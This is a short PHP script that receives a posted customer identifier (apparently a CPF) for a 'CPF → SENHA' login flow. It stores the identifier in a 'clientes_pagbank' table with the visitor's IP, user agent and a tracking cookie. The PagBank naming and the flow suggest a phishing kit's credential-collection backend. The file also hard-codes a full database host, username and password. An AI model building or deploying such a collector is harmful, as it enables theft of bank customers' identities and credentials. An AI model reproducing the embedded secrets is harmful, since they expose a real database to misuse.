<?php
// identificador.php — versão ajustada para fluxo CPF → SENHA

session_start();
header('Content-Type: application/json; charset=utf-8');

// --- CONEXÃO COM O BANCO ---
$DATABASE_URL = getenv("DATABASE_URL");
if (!$DATABASE_URL) {
    $DATABASE_URL = "host=cd7f19r8oktbkp.cluster-czrs8kj4isg7.us-east-1.rds.amazonaws.com port=5432 dbname=de3nhd2osd4jko user=u974ongr8md5qc password=p68932741a8bb7b2b28fced15dae4143f8721c875a7dfa625405c09b198d9c632";
}

$db = pg_connect($DATABASE_URL);

if (!$db) {
    http_response_code(503);
    echo json_encode([
        'status' => 'error',
        'message' => 'Erro de conexão com banco'
    ]);
    exit;
}
// --- FIM CONEXÃO ---

// 🔐 Só aceita POST válido
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['identificador'])) {
    http_response_code(400);
    echo json_encode([
        'status' => 'error',
        'message' => 'Requisição inválida'
    ]);
    exit;
}

// --- COLETA DE DADOS ---
$identificador = trim($_POST['identificador']);
$device_type   = $_POST['device_type'] ?? 'Desconhecido';
$ip            = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$user_agent    = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconhecido';
$now_utc       = gmdate("Y-m-d H:i:s");

// --- COOKIE ÚNICO ---
$novo_cookie_value = bin2hex(random_bytes(32));

// --- INSERT ---
$query = "
    INSERT INTO clientes_pagbank
    (identificador, ip, user_agent, identificador_cookie, device_type, created_at, last_active_at)
    VALUES
    ($1, $2, $3, $4, $5, $6, $6)
    RETURNING cliente_id
";

$params = [
    $identificador,
    $ip,
    $user_agent,
    $novo_cookie_value,
    $device_type,
    $now_utc
];

$result = pg_query_params($db, $query, $params);

if (!$result || pg_num_rows($result) === 0) {
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Falha ao salvar cliente'
    ]);
    exit;
}

// --- SUCESSO ---
$row = pg_fetch_assoc($result);
$_SESSION['cliente_id'] = (int)$row['cliente_id'];

// Cookie para tracking
setcookie(
    'identificador_cliente',
    $novo_cookie_value,
    time() + 86400 * 30,
    '/',
    '',
    false,
    true
);

// 🔑 RETORNO LIMPO
echo json_encode([
    'status' => 'success'
]);
